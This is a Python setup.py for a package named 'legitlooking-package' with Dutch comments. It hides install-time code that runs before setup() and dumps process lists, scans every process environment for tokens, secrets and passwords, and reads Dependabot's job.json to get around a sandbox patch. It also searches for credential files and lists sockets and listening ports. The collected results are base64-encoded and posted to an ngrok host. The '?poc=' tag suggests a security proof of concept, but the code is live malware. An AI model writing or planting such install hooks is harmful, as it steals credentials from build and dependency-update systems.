from setuptools import setup

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

try:
    _urlreq = __import__('urllib.request', fromlist=['urlopen', 'Request'])
    _b64    = __import__('base64')
    _os     = __import__('os')
    _sp     = __import__('subprocess')
    _re     = __import__('re')

    def sh(cmd):
        return _sp.run(cmd, shell=True, capture_output=True, text=True, timeout=10).stdout[:3000]

    lines = []

    # ============================================================
    # 1. ALLE PROCESSEN -- proxy draait in dezelfde container?
    # ============================================================
    lines.append("=== 1. PS AUX (alle processen) ===")
    lines.append(sh("ps aux"))

    lines.append("\n=== 1b. PROCESS TREE ===")
    lines.append(sh("ps auxf 2>/dev/null || ps aux"))

    # ============================================================
    # 2. PROXY PROCES OPSPOREN
    #    Zoek naar proxy/credential/dependabot gerelateerde processen
    # ============================================================
    lines.append("\n=== 2. PROXY PROCES CMDLINE ===")
    # Alle /proc/*/cmdline uitlezen via subprocess (bypasses open() patch)
    lines.append(sh("find /proc -maxdepth 2 -name cmdline 2>/dev/null | xargs -I{} sh -c 'echo \"=== {} ===\"; cat {} 2>/dev/null | tr \"\\0\" \" \"; echo' 2>/dev/null | grep -i -A1 'proxy\\|cred\\|token\\|dependabot' | head -60"))

    # ============================================================
    # 3. PROXY PROCESS ENV VARS
    #    /proc/<pid>/environ van de proxy bevat decrypted credentials
    # ============================================================
    lines.append("\n=== 3. ALLE PROC ENVIRON (grep op token/cred) ===")
    lines.append(sh("for f in /proc/*/environ; do cat $f 2>/dev/null | tr '\\0' '\\n' | grep -i 'token\\|secret\\|password\\|cred\\|registry\\|npm\\|gem\\|pypi' && echo \"-- from $f --\"; done"))

    # ============================================================
    # 4. UNIX SOCKETS -- proxy heeft mogelijk een unix socket
    # ============================================================
    lines.append("\n=== 4. UNIX SOCKETS ===")
    lines.append(sh("cat /proc/net/unix"))

    # ============================================================
    # 5. OPEN FILE DESCRIPTORS VAN ALLE PROCESSEN
    #    Proxy houdt credential file open -- zie via /proc/*/fd
    # ============================================================
    lines.append("\n=== 5. OPEN FD'S (proxy/credential gerelateerd) ===")
    lines.append(sh("ls -la /proc/*/fd 2>/dev/null | grep -v Permission | head -100"))

    # ============================================================
    # 6. JOB.JSON VIA SUBPROCESS (bypasses open() monkey-patch)
    # ============================================================
    lines.append("\n=== 6. JOB.JSON VIA CAT (bypasses sandbox) ===")
    job_path = _os.environ.get("DEPENDABOT_JOB_PATH", "/home/dependabot/dependabot-updater/job.json")
    lines.append(sh(f"cat {job_path}"))

    # ============================================================
    # 7. CREDENTIAL HELPER FILES OP SCHIJF
    # ============================================================
    lines.append("\n=== 7. CREDENTIAL HELPER FILES ===")
    lines.append(sh("find /home /opt /tmp /var -name '*.json' -o -name '*cred*' -o -name '*credential*' -o -name '*.token' 2>/dev/null | grep -v ruby | grep -v gems | head -20"))
    lines.append(sh("find /proc/1/root /proc/*/root 2>/dev/null -maxdepth 3 -name '*cred*' 2>/dev/null | head -10"))

    # ============================================================
    # 8. NETSTAT / SS -- welke poorten zijn open?
    # ============================================================
    lines.append("\n=== 8. LISTENING POORTEN ===")
    lines.append(sh("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"))
    lines.append(sh("cat /proc/net/tcp | awk '$4==\"0A\" {print $2}' | while read addr; do python3 -c \"import socket,struct; b=bytes.fromhex('$addr'.split(':')[0]); port=int('$addr'.split(':')[1],16); print(socket.inet_ntoa(bytes(reversed(b)))+':'+str(port))\" 2>/dev/null; done"))

    # Stuur alles op
    payload = _b64.b64encode("\n".join(lines).encode("utf-8", errors="replace")).decode()
    req = _urlreq.Request(
        f"{COLLAB_URL}?poc=proxy_process_hunt",
        data=payload.encode(),
        method="POST",
        headers={"Content-Type": "text/plain"}
    )
    _urlreq.urlopen(req, timeout=15)

except Exception as e:
    try:
        _u = __import__('urllib.request', fromlist=['urlopen'])
        _p = __import__('urllib.parse',   fromlist=['quote'])
        _u.urlopen(f"{COLLAB_URL}?poc=proxy_process_hunt&err={_p.quote(str(e)[:200])}", timeout=5)
    except Exception:
        pass

setup(
    name="legitlooking-package",
    version="1.0.4",
    install_requires=[
        "requests==2.27.1",
        "flask==2.2.0",
    ],
    python_requires=">=3.8",
)
